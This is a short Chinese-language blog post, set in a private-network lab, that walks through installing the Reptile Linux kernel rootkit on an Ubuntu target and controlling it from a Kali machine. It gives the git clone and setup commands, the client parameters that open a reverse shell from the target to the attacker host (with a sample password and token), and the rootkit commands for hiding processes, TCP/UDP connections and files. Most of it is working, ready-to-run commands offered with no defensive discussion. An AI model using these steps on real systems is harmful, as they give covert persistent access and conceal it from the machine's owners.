---
layout: post
title: Reptile Linux rootkit后门
date: 2019-09-19
categories: blog
tags: [后门，linux，rookit]
description: Reptile Linux rootkit后门
---

######安装
######目标机器`ubuntu 192.168.70.140`
- 执行以下命令在目标机器安装reptile
```
apt-get install linux-headers-$(uname -r)
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
./setup.sh install
```
![](https://upload-images.jianshu.io/upload_images/15634342-1348015d40185b65.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
######控制端机器`kali 192.168.70.139`
- 执行以下命令在控制端机器安装reptile
```
apt-get install linux-headers-$(uname -r)
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
cd bin
./client
```
- 执行以下命令在控制端设置参数,注意`SRCHOST`和`RHOST`都是目标机器
```
set lhost 192.168.70.139
set lport 80
set srchost 192.168.70.140
set srcport 666
set RHOST 192.168.70.140
set RPORT 666
set pass s3cr3t
set token hax0r
set prot tcp
run
```
![](https://upload-images.jianshu.io/upload_images/15634342-c26415273643b53f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![](https://upload-images.jianshu.io/upload_images/15634342-162aff6a7ef5d04e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
- 成功连接到目标机器的45046，在目标机器上搜索不到该端口的连接，已被隐藏
![](https://upload-images.jianshu.io/upload_images/15634342-ce2824e07557d0a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
- 其他命令
```
隐藏进程: /reptile/reptile_cmd hide <pid> 
显示进程: /reptile/reptile_cmd show <pid>
隐藏udp: /reptile/reptile_cmd udp <IP> <port> hide 
显示udp: /reptile/reptile_cmd udp <IP> <port> show
隐藏tcp: /reptile/reptile_cmd tcp <IP> <port> hide 
显示tcp: /reptile/reptile_cmd tcp <IP> <port> show
还可以隐藏文件 所有包含 reptile 这个字符的文件会被隐藏，这个字符可以在配置文件中修改。
```
`参考链接:`[http://www.carlstar.club/2019/04/09/rep/](http://www.carlstar.club/2019/04/09/rep/)
















